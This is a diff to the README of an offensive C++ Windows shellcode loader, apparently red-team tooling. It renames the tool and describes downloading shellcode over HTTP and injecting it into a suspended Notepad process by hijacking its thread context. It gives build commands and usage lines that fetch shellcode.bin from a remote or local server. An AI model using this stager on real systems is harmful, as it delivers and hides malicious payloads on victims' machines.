@@ -1,4 +1,4 @@
-A minimal C++ shellcode loader for Windows written for red team, malware research, and educational purposes.
+A simple Windows shellcode loader that downloads shellcode from a specified HTTP URL and injects it into a suspended process (Notepad.exe) using thread context hijacking.
 
 ## 🚀 Description
 
@@ -12,7 +12,7 @@ This tool demonstrates:
 
 ## 📂 Filename
 
-**HTTPStager.cpp** – Console-based shellcode loader (C++)
+**Suspended-Process-Stager.cpp** – Console-based shellcode loader (C++)
 
 ## 📌 Technique
 
@@ -30,13 +30,13 @@ This tool demonstrates:
 ## ⚙️ Build
 
 ```bash
-x86_64-w64-mingw32-g++ HTTPStager.cpp -o HTTPStager.exe -static -lwininet -s -Wl,-subsystem,console
+x86_64-w64-mingw32-g++ Suspended-Process-Stager.cpp -o Suspended-Process-Stager.exe -static -lwininet -s -Wl,-subsystem,console
 ```
 
 ## 🧪 Usage
 
 ```bash
-HTTPStager.exe http://<ip_address>/shellcode.bin
+Suspended-Process-Stager.exe http://<ip_address>/shellcode.bin
 ```
 
 ## 🛠️ Example Shellcode Generation
@@ -53,5 +53,5 @@ python3 -m http.server 80
 
 Then run
 ```bash
-HTTPStager.exe http://127.0.0.1/shellcode.bin
+Suspended-Process-Stager.exe http://127.0.0.1/shellcode.bin
 ```
